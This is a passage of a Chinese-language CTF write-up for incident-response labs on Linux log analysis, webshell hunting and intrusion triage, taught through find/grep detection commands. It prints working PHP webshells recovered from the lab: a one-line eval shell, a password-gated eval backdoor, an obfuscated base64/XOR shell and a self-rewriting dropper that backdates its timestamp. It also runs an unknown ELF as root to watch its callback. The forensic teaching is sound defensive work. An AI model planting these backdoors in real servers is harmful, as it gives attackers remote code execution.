步骤3：提取新用户信息\n\n\n例如，假设你得到了如下输出：\n\n```\nJan 12 10:32:15 server useradd[1234]: new user: name=testuser, UID=1001, GID=1001, home=/home/testuser, shell=/bin/bash\n这条日志显示了创建的新用户 testuser。\n增加一个kali用户日志\nJul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001\nJul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bash\nJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali\n```\n\n- 步骤4：分析执行上下文\n\n\n确认新用户的创建是否由合法用户执行，或是否有可疑的远程登录记录。\n\n- 步骤5：进一步确认\n\n\n结合其他日志文件，如 /var/log/syslog，查看是否有异常的命令执行或系统变更。\n\n所以我们的命令应该是\n\n```\ncat auth.log.1 | grep -a \"new\"\n```\n\n![image-20250421143903253](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421143903253.png)\n\n然后可以看到有两个新用户，但是只有第一个是在主机上创建的新用户，第二个可能是在云服务器上进行创建的新用户，实在不行我们可以先看看登录成功的时间，因为登录时间左右黑客首先就会选择创建后门用户\n\n![image-20250421144418703](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421144418703.png)\n\n```\nflag{test2}\n```\n\n至此关于Linux的日志分析就告一段落，建议学习的时候多进行手撸命令而不是ctrl+c和ctrl+v复制粘贴，同时感谢大佬的wp让我学到了很多知识，wp真的很细！！！\n\n### 第一章 应急响应-webshell查杀\n\n#### 什么是webshell\n\n**Webshell** 是一种通过 Web 服务器接口提供命令执行能力的恶意脚本。它通常被攻击者上传到受入侵的 Web 服务器上，以便远程执行命令和控制服务器。\n\n特点：\n\n- **脚本语言**：通常用 PHP、ASP、JSP、Python 等编写，依赖于目标服务器的环境。\n- **功能**：文件管理、命令执行、数据库操作、网络连接、权限提升等。\n- **隐蔽性**：通常伪装成正常文件或与网站现有文件混在一起，可能被混淆以逃避检测。\n- **通信**：使用 HTTP/HTTPS 协议进行通信，易于隐藏在普通网络流量中。\n\n#### 什么是webshell应急响应\n\n简单官方一点：WebShell应急响应是指在检测到WebShell（恶意Web脚本）攻击后，采取一系列措施来控制、消除威胁，并恢复受影响的系统和服务。WebShell是一种常见的攻击手段，攻击者通过上传或注入恶意脚本到Web服务器上，从而获得对服务器的远程控制权限，而我们需要做的就是找到问题所在根源并且解决掉它。\n\n#### 常规后门查杀\n\n1.1、静态检测\n\n我们可以查找一些特殊后缀结尾的文件。例如：.asp、.php、.jsp、.aspx。\n\n然后再从这类文件中查找后门的特征码，特征值，危险函数来查找webshell，例如查找内容含有exec()、eval()、system()的文件。\n\n优点：快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。\n\n缺点：漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。\n\n1.2、动态检测\n\nwebshell执行时刻表现出来的特征，我们称为动态特征。只要我们把webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。webshell如果执行系统命令的话，会有进程。Linux下就是起了bash，Win下就是启动cmd，这些都是动态特征。\n\n1.3、日志检测\n\n使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，例如：一个平时是GET的请求突然有了POST请求并且返回代码为200。\n\n2、工具排查webshell\n相对于手工排查，工具排查可能更好上手，但是如果想走的更远一些，某些线下的比赛可能会断网，也就说，手工排查的一些基本操作还是要明白的。（但是工具排查真的很香）\n\n#### webshell代码特征\n\n- 可疑函数调用\n\n\nWebShell通常会使用一些危险的函数来执行系统命令或代码，如：\n\nPHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()\n\nASP: Execute(), Eval(), CreateObject()\n\nJSP: Runtime.getRuntime().exec()\n\n- 编码和解码\n\nWebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：\n    \n\n```php\n eval(base64_decode('encoded_string'));\n```\n\n- 文件操作\n\nWebShell可能会包含文件操作函数，用于读取、写入或修改文件：\n\nPHP: fopen(), fwrite(), file_get_contents(), file_put_contents()\n\nASP: FileSystemObject\n\n- 网络操作\n\nWebShell可能会包含网络操作函数，用于与远程服务器通信：\nPHP: fsockopen(), curl_exec(), file_get_contents('http://...')\nASP: WinHttp.WinHttpRequest\n\n#### 解题\n\n##### 问题1:黑客webshell里面的flag\n\n这道题应该是让我们先找出webshell\n\n我们直接使用find命令查找特殊后缀的文件，然后管道符拼接xargs去匹配特征函数，xargs函数就是把命令1的结果当作输入给到命令2。\n\n上面刚刚也说了我们可以尝试定位一些特殊的后缀文件，例如：.asp、.php、.jsp、.aspx。\n\n我们先进入网站的运行目录\n\n```\ncd /var/www/html\n```\n\n但是在html目录下看到了可疑的shell.php\n\n![image-20250421145708879](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421145708879.png)\n\n不过这是意外惊喜，我们还是得用命令去检索一下\n\n```php\n//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征\nfind ./ -name \"*.jsp\" | xargs grep \"exec(\" \nfind ./ -name \"*.php\" | xargs grep \"eval(\" \nfind ./ -name \"*.asp\" | xargs grep \"execute(\" \nfind ./ -name \"*.aspx\" | xargs grep \"eval(\" \n    \n//对于免杀Webshell，可以查看是否使用编码\nfind ./ type f -name \"*.php\" | xargs grep \"base64_decode\" \n```\n\n代码解释:\n\n`xargs`：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，xargs将find命令找到的文件列表作为参数传递给grep命令。\n\n`grep \"eval(\"`：grep命令用于搜索文本，并输出匹配的行。这里\"`eval(`\"是grep命令的搜索模式，用于查找包含`eval(`字符串的行\n\n所以运行出来的结果是\n\n![image-20250421150114386](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421150114386.png)\n\n然后依次cat一下这三个文件\n\n![image-20250421150308847](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421150308847.png)\n\n发现这里有被注释掉的，应该是flag，不放心的话我们可以再把其他几个文件cat查看一下\n\n##### 问题二:黑客使用的什么工具的shell\n\n遇到这种类型，意思就是让我们分析一下是什么类型的webshell，其实我们已经可以猜测出是godzilla的webshell了\n\n为什么这么说\n\n哥斯拉病毒是一种Java后门木马，通常用于攻击并控制[Web服务器](https://so.csdn.net/so/search?q=Web服务器&spm=1001.2101.3001.7020)。特征就包括：\n\n> 1. **@session_start();** - 开启一个会话。\n> 2. **@set_time_limit(0);** - 设置脚本执行时间为无限。\n> 3. **@error_reporting(0);** - 关闭所有错误报告。\n\n这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。\n\n并且**哥斯拉的shell通常都会采用base64加密和异或算法的方法去加密数据**\n\n所以我们只需要找到它的github地址并且进行MD5加密即可；\n\n> Godzilla地址：https://github.com/BeichenDream/Godzilla\n\n文件内容中看到开头的三句就是哥斯拉的典型特征\n\n最终加密出来的flag\n\n```\nflag{39392de3218c333f794befef07ac9257}\n```\n\n##### 问题3:黑客隐藏shell的完整路径\n\n既然说是黑客隐藏的shell了，那我们就需要用到ls -a进行查找\n\n###### ls和ls -a和ls -l的区别\n\n`ls`\n\n- **功能**: 列出当前目录或指定目录中的文件和文件夹。\n- **输出**: 默认情况下，`ls` 不会显示以点（`.`）开头的隐藏文件。这些文件通常是系统配置文件或隐藏的文件。\n\n`ls -a`\n\n- **功能**: 列出当前目录或指定目录中的所有文件和文件夹，包括隐藏文件。\n- **输出**: `ls -a` 会显示所有文件，包括以点（`.`）开头的文件（隐藏文件）。此外，它还会显示两个特殊的目录：`.`（当前目录）和 `..`（上级目录）。\n\n**ls  -l**\n\n- `ls -l` 是 Linux 和 Unix 系统中用于列出目录内容的命令之一，它以详细的格式显示文件和目录的信息。与普通的 `ls` 命令相比，`ls -l` 提供了更多的文件属性信息\n\nls -l` 输出的内容包括以下信息：\n\n1. **文件类型和权限**：第一个字符表示文件类型（如 `-` 表示普通文件，`d` 表示目录，`l` 表示符号链接等），接下来的九个字符表示文件的权限（如 `rwxr-xr-x`）。\n2. **硬链接数**：显示文件的硬链接数量。\n3. **所有者**：显示文件的所有者用户名。\n4. **用户组**：显示文件所属的用户组。\n5. **文件大小**：以字节为单位显示文件的大小。\n6. **最后修改时间**：显示文件的最后修改日期和时间。\n7. **文件名**：最后显示文件或目录的名称。\n\n那我们就进入着三个文件的路径中逐个排查一下，然后在/var/www/html/include/Db目录下看到有隐藏的木马\n\n![image-20250421151015712](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421151015712.png)\n\n这里可以发现执行ls和ls -a是不一样的，出现了.Mysqli.php文件\n\ncat查看一下\n\n![image-20250421151059651](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421151059651.png)\n\n一个一样的哥斯拉的shell木马，猜测应该是隐藏的webshell了，我们拿路径去md5加密就可以了\n\n![image-20250421151214183](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421151214183.png)\n\n```\nflag{aebac0e58cd6c5fad1695ee4d1ac1919}\n```\n\n##### 问题4:黑客免杀马完整路径\n\n###### 什么是免杀马\n\n免杀马（免杀病毒或免杀Webshell）是指**经过特殊处理和混淆**，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n\n###### 常见的免杀技术\n\n- 代码混淆：\n\n\n使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。\n\n- 编码和加密：\n\n使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。\n\n- 动态生成和执行：\n\n通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。\n\n- 多层解码：\n\n多层编码或加密，增加分析和检测的难度。\n\n- 使用合法函数：\n\n恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。\n\n###### 查找和处理免杀马的方法；\n\n- 文件完整性检查：\n\n\n比较当前文件与已知的良性备份文件，发现被修改或新增的文件。\n\n- 代码审查：\n\n手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。\n\n- 安全扫描工具：\n\n使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。\n\n- 日志分析：\n\n查看服务器访问日志和错误日志，寻找异常访问和执行模式。\n\n检查文件修改时间，与正常更新周期不符的文件可能是可疑的。\n\n- 基于特征的检测：\n\n使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。\n\n既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。\n\n###### windows上的网站日志路径\n\n- IIS（Internet Information Services）\n\n\nIIS是Windows上的默认Web服务器，其日志文件默认存储在以下路径：\n\n- IIS 6.0 及更早版本：\n\n\nC:\\WINDOWS\\system32\\LogFiles\\W3SVC[SiteID]\\\n\n- IIS 7.0 及更高版本：\n\n\nC:\\inetpub\\logs\\LogFiles\\W3SVC[SiteID]\\\n\n其中，[SiteID] 是网站的标识符，通常是一个数字。\n\n- Apache HTTP Server\n\n\n如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：\n\nC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\\n\n或者\n\nC:\\Program Files\\Apache Group\\Apache2\\logs\\\n\n具体路径取决于安装时选择的位置。\n\n- Linux系统中的网站日志路径\n\n\n- Apache HTTP Server\n\n\n在Linux上，Apache日志文件通常位于以下目录：\n\n访问日志：\n\n/var/log/apache2/access.log\n\n或者\n\n/var/log/httpd/access_log\n\n错误日志：\n\n/var/log/apache2/error.log\n\n或\n\n/var/log/httpd/error_log\n\n不同的Linux发行版可能有不同的目录。例如，在Debian/Ubuntu上通常使用/var/log/apache2/，而在Red Hat/CentOS上通常使用/var/log/httpd/。\n\n- Nginx\n\n\nNginx是另一个流行的Web服务器，默认的日志文件路径如下：\n\n访问日志：\n\n/var/log/nginx/access.log\n\n错误日志：\n\n/var/log/nginx/error.log\n\n###### 如何查看和分析日志文件？\n\nWindows：\n\n使用文本编辑器（如Notepad、Notepad++）直接打开日志文件查看。\n可以使用IIS管理器查看IIS日志。\nLinux：\n\n使用命令行工具查看日志，例如：\n\ntail -f /var/log/apache2/access.log \n\ntail -f /var/log/nginx/access.log\n\n可以使用日志分析工具（如GoAccess、AWStats）生成可视化的日志报告。\n\n接下来我们就进入日志文件的排查(因为我是另一种方法，所以这里直接搬大佬的过程)\n\n![image-20250421151550443](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421151550443.png)\n\n我们到apache2目录下面查看一下access.log日志，查看分析一下\n\n![image-20250421151821603](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421151821603.png)\n\n这里是上传了一个shell.php并且访问成功，说明这里上传成功了\n\n![image-20250421152032064](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421152032064.png)\n\n我们可以看到有个名为top.php的文件和index.php文件执行了phpinfo()；且返回值为200，有点可疑。去翻一下呢\n\n```php\n//top.php\n<?php\n\n$key = \"password\";\n\n//ERsDHgEUC1hI\n$fun = base64_decode($_GET['func']);\nfor($i=0;$i<strlen($fun);$i++){\n    $fun[$i] = $fun[$i]^$key[$i+1&7];\n}\n$a = \"a\";\n$s = \"s\";\n$c=$a.$s.$_GET[\"func2\"];\n$c($fun);\n\n//inde.php\n<?php\ninclude \"../config.php\";\n//载入公共变量\ninclude SYS_ROOT.INC.\"common.php\";\n//数据处理\n\n$dbit=new Dbclass(SYS_ROOT.DB_NAME);\n$id=Base::safeword($_GET['id'],1);\n$page=Base::safeword($_GET['p'],1);\n$eachpage=EACHPAGE;\n$cat=Base::safeword($_GET['cat'],1);\n$name=Base::safeword( Base::safeword($_POST['name'],3),5);\n$comment=Base::safeword( Base::safeword($_POST['comment'] , 3 ) , 5);\n$article_id=Base::safeword($_POST['article_id'],1);\n//配置说明\n$webname=WEBNAME;\n$webinfo=WEBINFO;\n$weburl=WEBURL;\n//公告\n$announce=ANNOUNCE;\n//直接用数组缓存\ninclude(SYS_ROOT.CACHE.\"cat_array.inc\");\n//文章页参数缓存\ninclude(SYS_ROOT.CACHE.\"art_array.inc\");\n$mobile=Base::safeword($_POST['mobile'],4);\nif($mobile){\n        if($name==''||$comment=='')die('Please input your name and comment correctly!<a href=\"?id='.$article_id.'\">Back</a>');\n        $tmp['article_id']=$article_id;\n        $tmp['name']=Base::safeword($name,4);\n        $tmp['emails']='ok@ok.com';\n        $tmp['content']=Base::safeword($comment,5);\n        $tmp['ips']=Base::realip();\n        $tmp['times']=Base::getnowtime();\n        $data['status']=1;\n        $addstatus=$dbit->add_one(TB.\"comment\",$tmp);\n        $dbit->updatelist(TB.\"cms\",\"cmtcount=cmtcount+1\",$tmp['article_id']);\n        die('^_^Submit Succefully!<a href=\"?id='.$article_id.'\">GO ON!</a>');\n\n}\nif($id){\n\n        //上一篇\n        $upart=$dbit->get_one(TB.\"cms\",\"status=1 and id<\".($id),\"id,name\",1);\n        //下一篇\n        $downart=$dbit->get_one(TB.\"cms\",\"status=1 and id>\".($id),\"id,name\",1,'id ASC');\n        //评论\n        $commenttotal=$dbit->get_one(TB.\"comment\",\"status=1 and article_id=\".($id),\"count(*)\");\n        $cmtotal=$commenttotal['count(*)'];\n        $comments=$dbit->getlist(TB.\"comment\",\"status=1 and article_id=\".($id),\"*\");\n        $atl=$dbit->get_one(TB.\"cms\",\"status=1 and id=\".$id,\"*\",1);\n        $addtitle=$atl['name']?$atl['name'].\"_\":\"\";\n        $tpl = new Template();\n        include($tpl->myTpl('wap_display','','$tpl'));\n}else{\n        //评论\n        $recnetcmts=$dbit->getlist(TB.\"comment\",'status=1',\"content,article_id,name\",10);\n        $total=$articleData['count'];\n        $indexs='wap_index';\n        if($cat){\n                $totaldata=$dbit->getlist(TB.\"cms\",\"status=1 and cat=\".$cat,\"count(*)\");\n                $total=$totaldata[0]['count(*)'];\n                $addtail=\"&cat=\".$cat;\n                $indexs='wap_index';\n        }\n        $uppage=$page>0?$page-1:0;\n        $downpage=($page+1)*$eachpage<$total?$page+1:$page;\n        $o=$dbit->getlist(TB.\"cms\",\"status=1 and \".($cat?\"cat=\".$cat:\"1=1\"),\"*\",$eachpage*$page.','.$eachpage,\"orders DESC,id DESC\");\n        $catinfo=$dbit->getlist(TB.\"category\",\"status=1 and id=\".$cat);\n        $addtitle=$catinfo[0]['name']?$catinfo[0]['name'].\"_\":\"\";\n        //模板生效\n        $tpl = new Template();\n        include($tpl->myTpl($indexs,'','$tpl'));\n}\n?>  \n```\n\n可以发现top.php文件是一个高度混淆的webshell代码，进行了base64编码和异或的解密，并通过动态拼接构造危险函数，例如下面的传参\n\n![image-20250421152448652](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421152448652.png)\n\n我们顺着代码解密一下\n\n![image-20250421152700245](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421152700245.png)\n\n可以看到这里构造了一个phpinfo()函数；最后结合\n\n```\n$a = \"a\";\n$s = \"s\";\n$c=$a.$s.$_GET[\"func2\"];\n$c($fun);\n//传参func2=sert\n构造出assert(phpinfo());\n```\n\n很明显就是在尝试执行phpinfo()函数了\n\n通过对日志文件的排查，最终可以确定top.php文件是恶意文件\n\n不过还有一种方法比较有运气成分，我猜测免杀马用的是base64编码加密，所以我直接手动搜索\n\n```\nfind ./ -name \"*.php\" | xargs grep \"base64_decode\"\n```\n\n这里在`/var/www/html/wap/top.php`中找到了 Base64 加密方法 \n\n![image-20250421152900317](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421152900317.png)\n\n###### 为什么可以确认是恶意文件？\n\n- 混淆和隐藏：\n\n使用Base64编码和字符异或操作来混淆代码。这些技术通常用于隐藏恶意代码，避免被直接检测到。\n\n- 动态执行：\n\n动态生成并调用函数。这种模式允许攻击者通过URL参数传递任意代码并在服务器上执行，具有极大的危险性。\n\n- 外部输入：\n\n使用$_GET参数来控制代码行为。通过外部输入来决定代码逻辑，使得攻击者可以远程控制服务器，执行任意PHP代码。\n\n```\nflag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}\n```\n\n### 第一章 应急响应- Linux入侵排查\n\n#### 什么是木马?\n\n**木马（Trojan Horse）** 是一种伪装成合法软件的恶意程序，其目的是为攻击者提供对受感染机器的远程访问。\n\n特点：\n\n- **伪装性**：通常捆绑或伪装成合法应用程序。\n- **后门功能**：允许攻击者对系统进行远程控制。\n- **多功能性**：可以包括键盘记录、屏幕截图、文件传输、权限提升等功能。\n- **持续性**：常常设法在系统重启后继续运行。\n\n#### 检测：\n\n#### 什么是linux入侵排查\n\n**Linux入侵排查**是应急响应的一部分，专门针对Linux系统进行安全事件的调查和分析。\n\n具体的排查方法我就不赘述了，上面两次也写过了\n\n#### 两种方法的好处\n\n1.手工排查的好处\n\n- 灵活性高：\n\n\n手工排查能够根据具体情况和需求进行灵活调整，针对特定的可疑活动进行详细分析。\n\n- 深度理解：\n\n手工排查需要深入理解系统和日志，这有助于安全人员提高对系统和安全事件的理解和认识。\n\n- 精确性强：\n\n手工排查可以通过逐行分析日志和系统信息，发现工具可能遗漏的细微线索和异常行为。\n\n- 适应性强：\n\n对于新型威胁和未知攻击，手工排查可以快速调整策略进行应对，而不需要依赖工具的更新和支持。\n2.工具排查的好处\n\n- 效率高：\n\n\n工具可以快速处理大量数据和日志，节省时间，提高分析效率。\n\n- 全面性：\n\n工具能够自动化地扫描和分析系统的各个方面，提供全面的检测和报告。\n\n- 重复性强：\n\n工具可以进行重复性工作，减少人为错误和疏漏，提高一致性和准确性。\n\n- 集成性好：\n\n现代安全工具通常集成了多种功能，如日志分析、恶意软件检测、漏洞扫描等，提供一站式解决方案。\n\n#### 解题\n\n##### 问题1:web目录存在木马，请找到木马的密码提交\n\n需要我们找到这个木马并把木马的密码提交\n\n因为是web目录的，那还是在/var/www/html目录下\n\n先进入/var/www/html目录查看木马，跟上面的基本查看webshell是一样的\n\n```\nfind ./ -name \"*.php\" | xargs grep \"eval(\"\n```\n\n![image-20250421155238313](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421155238313.png)\n\n可以看出查出三个后缀为.php的文件，题目要求我们把木马的密码提交，就这三个文件很明显嘛，不是pass就是1咯，我们挨个看一下\n\n```php\n//1.php\n<?php eval($_POST[1]);?>\n```\n\n这是最经典的一句话木马\n\n#### 一句话木马\n\n一句话木马是一种极为简短且隐蔽的恶意代码，通常嵌入到网站的 PHP 文件中，用于远程执行任意代码或命令。这种木马之所以被称为“一句话木马”，是因为它们通常只包含一行代码，但功能强大且危险。\n\n一句话木马特征\n\n- 简短：通常只有一行代码，易于隐藏和注入。\n- 使用 eval 函数：利用 eval 函数执行传入的 PHP 代码。\n- 通过 HTTP 参数传递代码：常见的方式是通过 GET 或 POST 请求参数传递要执行的代码。\n- 基础验证：一些一句话木马会有简单的验证机制，比如检查一个参数的值是否符合某个条件。\n\n可以看到1.php中木马的密码是1，直接提交flag就行了\n\n```\nflag{1}\n```\n\n我们再看看其他两个\n\n```php\n//.shell.php\n<?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?>\n```\n\n```php\n//index.php\n<?php\ninclude('config.php');\ninclude(SYS_ROOT.INC.'common.php');\n$path=$_SERVER['PATH_INFO'].($_SERVER['QUERY_STRING']?'?'.str_replace('?','',$_SERVER['QUERY_STRING']):'');\nif(substr($path, 0,1)=='/'){\n        $path=substr($path,1);\n}\n$path = Base::safeword($path);\n$ctrl=isset($_GET['action'])?$_GET['action']:'run';\nif(isset($_GET['createprocess']))\n{\n        Index::createhtml(isset($_GET['id'])?$_GET['id']:0,$_GET['cat'],$_GET['single']);\n}else{\n        Index::run($path);\n}\n$file = '/var/www/html/.shell.php';\n$code = '<?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?>';\nfile_put_contents($file, $code);\nsystem('touch -m -d \"2021-01-01 00:00:01\" .shell.php');\nusleep(3000);\n?>\n```\n\n这个是关于不死马的代码，下面会具体分析\n\n##### 问题2:服务器疑似存在不死马，请找到不死马的密码提交\n\n#### 什么是不死马\n\n不死马（Persistence Backdoor）是一种能够在系统中保持长期存在并持续运行的恶意软件，即使系统重启或某些安全措施生效后，它依然能够恢复运行。不死马通常会通过修改系统关键配置、添加定时任务、劫持系统进程等手段来实现持久化。\n\n简单来说；\n\n不死马是一种具有持久性的后门程序，它被设计用来在受感染的系统上长期驻留并保持活跃。其目的是确保攻击者对系统的访问不会因为系统重启或其他干预措施而中断。\n\n不死马特征\n\n- 持久性：\n\n\n自启动：通过修改系统启动项、服务、计划任务等方式实现自启动。\n\n文件隐藏：使用技术手段隐藏自身文件，避免被发现和删除。\n\n多重存在：可能在多个位置部署副本，增强存活能力。\n\n- 隐蔽性：\n\n低调运行：以低优先级运行，不占用过多系统资源，减少被注意的可能。\n\n多态性：定期更改自身代码或行为模式，规避签名检测。\n\n日志清除：清除自身操作痕迹，减少被追踪的可能。\n\n- 多样化的保持机制：\n\n启动项：在 Windows 中，可以修改注册表中的启动项，在 Linux 中，可以修改 rc.local 或 crontab。\n服务劫持：创建或劫持合法的系统服务。\n计划任务：在系统计划任务中添加恶意任务。\n\n因为我们刚刚找到了三个木马，所以我们继续看别的两个木马\n\n```php\n//.shell.php\n<?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?>\n```\n\n```php\n//index.php\n<?php\ninclude('config.php');\ninclude(SYS_ROOT.INC.'common.php');\n$path=$_SERVER['PATH_INFO'].($_SERVER['QUERY_STRING']?'?'.str_replace('?','',$_SERVER['QUERY_STRING']):'');\nif(substr($path, 0,1)=='/'){\n        $path=substr($path,1);\n}\n$path = Base::safeword($path);\n$ctrl=isset($_GET['action'])?$_GET['action']:'run';\nif(isset($_GET['createprocess']))\n{\n        Index::createhtml(isset($_GET['id'])?$_GET['id']:0,$_GET['cat'],$_GET['single']);\n}else{\n        Index::run($path);\n}\n$file = '/var/www/html/.shell.php';\n$code = '<?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?>';\nfile_put_contents($file, $code);\nsystem('touch -m -d \"2021-01-01 00:00:01\" .shell.php');\nusleep(3000);\n?>\n```\n\n这里可以看到index.php中在`/var/www/html/` 目录下创建一个名为 `.shell.php` 的后门文件，并伪造其时间戳以试图隐藏其存在。该后门文件包含恶意代码，通过 `md5` 哈希验证密码后，执行传入的命令。这种后门文件可以被攻击者用来远程执行任意命令，从而完全控制服务器。\n\n代码解释:\n\n- 定义后门文件路径：\n\n$file = '/var/www/html/.shell.php';\n\n$file 变量定义了后门文件的存放路径 /var/www/html/.shell.php。\n\n- 定义后门代码：\n\n$code =` '<?php if(md5($_POST[\"pass\"])==\"5d41402abc4b2a76b9719d911017c592\"){@eval($_POST[cmd]);}?>';`\n\n$code 变量定义了后门代码。\n\n该代码通过 md5 哈希验证 POST 请求中的密码（pass 参数），如果匹配，则执行 POST 请求中的命令（cmd 参数）。\n\n- 写入后门文件：\n\nfile_put_contents($file, $code);\n\n使用 file_put_contents 函数将后门代码写入到 $file 指定的文件路径中，即创建或覆盖 .shell.php 文件。\n\n- 伪造文件时间戳：\n\nsystem('touch -m -d \"2021-01-01 00:00:01\" .shell.php');\n\n使用 system 函数执行 touch 命令，修改 .shell.php 文件的修改时间为 2021-01-01 00:00:01，以伪造文件的修改时间，试图隐藏其创建和修改痕迹。\n\n- 微小延时：\n\nusleep(3000);\n\n使用 usleep 函数增加 3000 微秒（3 毫秒）的延时，虽然这个延时很短，但可能用于调节执行的节奏，以掩盖其操作痕迹。\n\n\n所以这一套下来基本就是可以确认.shell.php文件就是由这个文件生成的，并且每隔usleep(3000)就生成一个新文件，所以达到了不死马的条件；\n\n那既然我们不死马知道是谁了，并且也知道了是由谁生成不死马，那密码肯定就是那串MD5；那我们拿去解密一下就可以拿到flag了\n\n![image-20250421160909697](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421160909697.png)\n\n##### 问题3:不死马是通过哪个文件生成的，请提交文件名\n\n上面就可以看到了不死马是在index.php中进行创建生成的，直接交文件名就行\n\n##### 问题4：黑客留下了木马文件，请找出黑客的服务器ip提交\n\n我第一个去看了登录日志看看是否有创建用户或者跟用户有关的操作\n\n![image-20250421161213790](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421161213790.png)\n\n但是我们这里搜查了两个都没得回显，然后我去看了apache的日志文件，猜测会用POST的方法去上传木马文件\n\n```\ncat access.log.1 | grep -a \"POST\"\n```\n\n也没啥收获\n\n我们只能返回刚刚的目录检查一下可疑文件可以看到有一个`‘shell(1).elf’`\n\n首先我们对这个文件进行提权，使所有用户都能无限制的访问此文件\n\n```\nroot@ip-10-0-10-11:/var/www/html# chmod 777 'shell(1).elf'\n```\n\n然后我们运行，让他产生外联行为\n\n```\nroot@ip-10-0-10-11:/var/www/html# ./'shell(1).elf'\n```\n\n但是这个时候我们的终端是会卡住的，需要另外起一个终端并运行\n\n```\nnetstat -antlp | more\n```\n\n#### netstat 命令\n\nnetstat 是一个网络工具，用于显示网络连接、路由表、接口统计信息、伪装连接和多播成员信息。\n\n选项和参数\n\n-a：显示所有连接中的端口，包括监听和非监听。\n-n：以数字形式显示地址和端口号，而不是将其解析为主机名或服务名。\n-t：显示 TCP 连接。\n-l：显示监听状态的套接字。\n-p：显示使用每个套接字的程序。\n\n![image-20250421161959689](../image/achieve/202411/玄机第一章Linux日志分析/image-20250421161959689.png)\n\n字段解释\n\n- Proto：协议（Protocol）\n\n\n显示协议类型，常见的有 tcp 和 udp。\n\n- Recv-Q：接收队列（Receive Queue）\n\n显示接收队列的字节数。接收队列中的字节数是应用程序还未处理的接收数据。\n\n- Send-Q：发送队列（Send Queue）\n\n显示发送队列的字节数。发送队列中的字节数是已经被应用程序发送，但还未被远程主机接收的字节数。\n\n- Local Address：本地地址\n\n显示本地端的 IP 地址和端口号。例如：0.0.0.0:80 表示本地所有 IP 地址上的 80 端口。\n\n- Foreign Address：远程地址\n\n显示远程端的 IP 地址和端口号。例如：192.168.1.1:12345 表示远程 IP 为 192.168.1.1 的 12345 端口。\n\n- State：状态\n\n显示连接的状态。常见状态有：\n\nLISTEN：正在监听连接。\n\nESTABLISHED：已建立连接。\n\nCLOSE_WAIT：等待关闭连接。\n\nTIME_WAIT：等待足够的时间以确保远程主机收到关闭请求。\n\n- PID/Program name：进程 ID 和程序名\n\n显示使用该连接的进程的进程 ID 和程序名。例如：1234/nginx 表示进程 ID 为 1234 的 nginx 程序。\n\n然后我们找到.shell.elf文件的那一行就可以看到我们想要的的信息了\n\n```\nflag{10.11.55.21}\n```\n\n##### 问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交\n\n#### 什么是监听端口号？\n\n监听端口号（Listening Port）是网络通信中用于等待和接收传入连接请求的端口号。服务器或服务在特定端口上监听，以便与客户端建立连接。这种机制确保了网络应用程序能够接收和处理来自其他网络设备的请求。\n\n基本概念\n\n端口号：计算机网络中的端口号是用于标识特定应用程序或进程的逻辑端点。端口号的范围是0到65535，其中0到1023为系统保留端口，一般用于知名服务。\n监听（Listening）：当一个应用程序或服务在某个端口上“监听”时，它在等待并准备接受来自该端口的连接请求。\n\n从上面的图里面可以看到是3333端口，直接提交就行了\n\n```\nflag{3333}\n```\n\n### 